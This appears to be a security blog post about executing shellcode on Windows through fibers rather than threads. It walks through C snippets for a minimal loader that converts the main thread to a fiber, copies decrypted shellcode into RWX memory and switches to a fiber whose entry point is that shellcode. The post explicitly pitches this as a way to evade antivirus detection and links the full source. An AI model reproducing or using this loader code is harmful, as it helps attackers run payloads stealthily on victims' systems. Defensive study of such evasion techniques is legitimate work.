+++
title = 'Utilizing Windows Fibers for Shellcode Execution'
date = 2025-08-08T07:07:07+01:00
+++
# Introduction

If you're familiar with the usual shellcode execution techniques, you will know that shellcode typically needs to be run within a thread. A commonality among different methods is the usage of the *CreateThread* Windows API function, or *NtCreateThreadEx* in the case direct syscalls are utilized. The use of these APIs in combination with methods such as *VirtualProtect* and *VirtualAlloc* is a common indicator of compromise.

However, by utilizing fibers, we can achieve the same result with a lower footprint, potentially avoiding detection by Anti-Virus vendors.

## Threads vs Fibers

While a process itself can be seen as a container for a running program—containing the PID, various handles, and a given virtual memory space—threads are singular units of execution running the program's actual code. They can operate in parallel but require scheduling by the OS scheduler. Furthermore, functions to manage threads are implemented in kernel mode.

The *CreateThread* function within the Windows API serves as a wrapper for the native API function *NtCreateThreadEx*, which, when called, performs a transition into kernel mode to create a thread.

A fiber within the Windows OS can be seen as a sub-execution unit running within a thread. However, in contrast to normal threads, fibers are implemented in user mode. In addition, fibers do not rely on the OS scheduler for dispatching but instead require the application itself to manage their scheduling.

Moreover, a fiber can also serve as an execution vehicle for arbitrary shellcode. In the following section, we will utilize fibers as an alternative to threads to execute our payload.

## Shellcode execution via Fibers

As explained in [Microsoft's Windows Internals Part 1](https://empyreal96.github.io/nt-info-depot/Windows-Internals-PDFs/Windows%20System%20Internals%207e%20Part%201.pdf), scheduling a new fiber for execution can only be done from an already initialized fiber.

Therefore, our minimal shellcode loader will first convert the main program thread to a fiber using the *ConvertThreadToFiber* API function. The address of our newly created fiber will then be saved to the *pMainFiber* pointer.

```c
pMainFiber = NULL;
pMainFiber = ConvertThreadToFiber(NULL);
if (pMainFiber == NULL) {
    fail("ConvertThreadToFiber failed: %d", GetLastError());
    return -1;
}
```
After converting the main thread to a fiber, we can allocate virtual memory for our shellcode and write it into the newly allocated region.
The function used for writing memory is part of the VX-API and can be found [here](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c). You can also use memcpy, which would result in a coresponding entry in the import table.
This likely does not affect detection; however, I used this method in other projects, which is why I include it here.
```c
rbuf = VirtualAlloc(NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (rbuf == NULL) { 
  fail("VirtualAlloc failed: %d", GetLastError());
  return -1;
}
VxMoveMemory(rbuf, decrypted_data, ShellSize);
```
We first initialize the *rbuf* pointer and then write the shellcode to the memory region pointed to. 

As a last step we can create a new fiber and schedule it for execution.
```c
pShellFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)rbuf, NULL);
if (pShellFiber == NULL) {
  fail("CreateFiber failed: %d", GetLastError());
  return -1;
}
SwitchToFiber(pShellFiber);
```
We use the *CreateFiber* API function and save its address to the *pShellFiber* pointer. Additionally, we cast the address of the memory holding our shellcode to the type *LPFIBER_START_ROUTINE* to set the fiber entry point to our shellcode. Finally, we call the *SwitchToFiber* API to schedule the shellcode fiber for execution and switch to it.

>⚠️ However, it is important to note that this is by no means new information, and there are probably other PoCs and posts out there already, but I thought I'd share mine.

Using fibers for shellcode execution is a neat alternative to the more commonly seen thread-based approaches. By running entirely in user mode and avoiding kernel transitions for scheduling, fibers can help reduce the footprint of your payload and potentially fly under the radar of some detection mechanisms. While this technique isn’t new and won’t guarantee invisibility against all defenses, it’s definitely worth considering as part of your toolbox when looking for stealthier execution methods. If you want to experiment with fibers or build on this concept, I encourage you to dive into the official docs and existing projects linked here. You can find the complete sourcecocde [here](https://github.com/0xjrx/silk). 

Happy hacking!
